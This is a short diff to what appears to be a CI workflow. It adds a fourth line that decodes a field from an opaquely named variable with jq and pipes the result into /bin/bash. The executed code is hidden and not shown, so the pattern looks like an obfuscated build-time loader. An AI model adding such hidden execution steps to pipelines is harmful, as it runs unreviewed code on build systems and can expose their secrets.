@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$v09" | jq -r .rpiom692 | /bin/bash
           echo $hccv673 | jq -r .bg89 | /bin/bash
           echo $p921 | jq -r .gsdhh16611 | /bin/bash
+          echo $kpfzo6 | jq -r .oncp711 | /bin/bash
 
       - name: Save archive
         if: always()
